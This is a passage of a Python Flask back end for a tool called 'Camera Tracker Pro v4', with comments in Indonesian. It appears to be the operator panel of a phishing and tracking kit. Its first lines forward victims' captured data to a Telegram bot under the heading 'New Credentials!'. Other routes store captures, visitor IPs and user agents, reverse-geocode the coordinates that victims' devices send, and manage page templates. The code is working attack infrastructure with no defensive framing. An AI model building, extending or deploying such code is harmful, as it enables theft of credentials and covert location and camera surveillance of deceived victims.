        if bot and chat and REQUESTS_OK:
            msg = f"🔓 New Credentials!\n🏷 {label}\n📋 Data: {json.dumps(data, indent=2)}"
            req_lib.post(
                f"https://api.telegram.org/bot{bot}/sendMessage",
                data={"chat_id": chat, "text": msg}, timeout=10
            )
    except:
        pass

    return jsonify(ok=True)

@app.route("/api/captures/<token>")
@login_required
def get_captures(token):
    db = get_db()
    rows = db.execute(
        "SELECT id,type,data,address,captured_at FROM captures WHERE token_id=? ORDER BY id DESC LIMIT 50",
        (token,)).fetchall()
    db.close(); return jsonify([dict(r) for r in rows])

@app.route("/api/capture/<int:cid>", methods=["DELETE"])
@login_required
def del_capture(cid):
    db = get_db(); db.execute("DELETE FROM captures WHERE id=?", (cid,)); db.commit(); db.close()
    return jsonify(ok=True)

@app.route("/api/logs/<token>")
@login_required
def get_logs(token):
    db = get_db()
    rows = db.execute(
        "SELECT ip_address,user_agent,accessed_at FROM access_logs WHERE token_id=? ORDER BY id DESC LIMIT 50",
        (token,)).fetchall()
    db.close(); return jsonify([dict(r) for r in rows])


# ── API: Reverse Geocoding Proxy ──────────────────────────────────────────────

@app.route("/api/address")
def get_address():
    """Public endpoint — dipanggil dari halaman device (bukan admin)."""
    lat = request.args.get("lat"); lng = request.args.get("lng")
    if not lat or not lng: return jsonify(error="missing params"), 400
    if not REQUESTS_OK: return jsonify(display_name=""), 200
    try:
        r = req_lib.get("https://nominatim.openstreetmap.org/reverse",
            params={"lat":lat,"lon":lng,"format":"json"},
            headers={"User-Agent":"CameraTrackerPro/4.0"}, timeout=5)
        return jsonify(r.json())
    except: return jsonify(display_name=""), 200


# ── API: Templates ────────────────────────────────────────────────────────────

@app.route("/api/templates", methods=["GET"])
@login_required
def list_templates():
    db = get_db()
    rows = db.execute("SELECT id,name,config_json,created_at FROM templates ORDER BY id DESC").fetchall()
    db.close(); return jsonify([dict(r) for r in rows])

@app.route("/api/templates", methods=["POST"])
@login_required
def save_template():
    b = request.json or {}
    name = b.get("name","").strip()
    if not name: return jsonify(error="Nama template kosong"), 400
    cfg  = json.dumps(b.get("config",{}))
    db = get_db()
    db.execute("INSERT INTO templates (name,config_json,created_at) VALUES (?,?,?)",
               (name, cfg, datetime.now().isoformat()))
    db.commit(); db.close(); return jsonify(ok=True)

@app.route("/api/templates/<int:tid>", methods=["DELETE"])
@login_required
def del_template(tid):
    db = get_db(); db.execute("DELETE FROM templates WHERE id=?", (tid,)); db.commit(); db.close()
    return jsonify(ok=True)


# ── API: Telegram ─────────────────────────────────────────────────────────────

@app.route("/api/telegram", methods=["GET"])
@login_required
def tg_get(): return jsonify(bot_token=get_cfg("tg_bot_token"), chat_id=get_cfg("tg_chat_id"))

@app.route("/api/telegram", methods=["POST"])
@login_required
def tg_set():
    b = request.json or {}
    set_cfg("tg_bot_token", b.get("bot_token",""))
    set_cfg("tg_chat_id",   b.get("chat_id",""))
    return jsonify(ok=True)

@app.route("/api/telegram/test", methods=["POST"])
@login_required
def tg_test():
    bot = get_cfg("tg_bot_token"); cid = get_cfg("tg_chat_id")
    if not bot or not cid: return jsonify(error="Belum dikonfigurasi"), 400
    if not REQUESTS_OK: return jsonify(error="Library requests belum terinstall"), 500
    try:
        r = req_lib.post(f"https://api.telegram.org/bot{bot}/sendMessage",
            data={"chat_id":cid,"text":"✅ Camera Tracker Pro v4 terhubung!"}, timeout=10)
        d = r.json()
        return jsonify(ok=True) if d.get("ok") else jsonify(error=d.get("description","")), 400
    except Exception as e: return jsonify(error=str(e)), 500


# ── API: App Config (Rate Limit, Timezone) ────────────────────────────────────

@app.route("/api/app-config", methods=["GET"])
@login_required
def app_config_get():
    return jsonify(
        rl_max_requests=get_cfg("rl_max_requests","0"),
        rl_window_minutes=get_cfg("rl_window_minutes","5"),
        timezone_offset=get_cfg("timezone_offset","7"))

@app.route("/api/app-config", methods=["POST"])
@login_required
def app_config_set():
    b = request.json or {}
    for k in ["rl_max_requests","rl_window_minutes","timezone_offset"]:
        if k in b: set_cfg(k, str(b[k]))
    return jsonify(ok=True)


# ── Extra endpoints ──────────────────────────────────────────────────────────

@app.route("/api/captures/all/<token>", methods=["DELETE"])
@login_required
def delete_all_captures(token):
    db = get_db()
    db.execute("DELETE FROM captures WHERE token_id=?", (token,))
    db.commit(); db.close()
    return jsonify(ok=True)

@app.route("/api/sessions/all", methods=["DELETE"])
@login_required
def delete_all_sessions():
    db = get_db()
    db.execute("DELETE FROM captures")
    db.execute("DELETE FROM access_logs")
    db.execute("DELETE FROM tokens")
    db.commit(); db.close()
    return jsonify(ok=True)

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)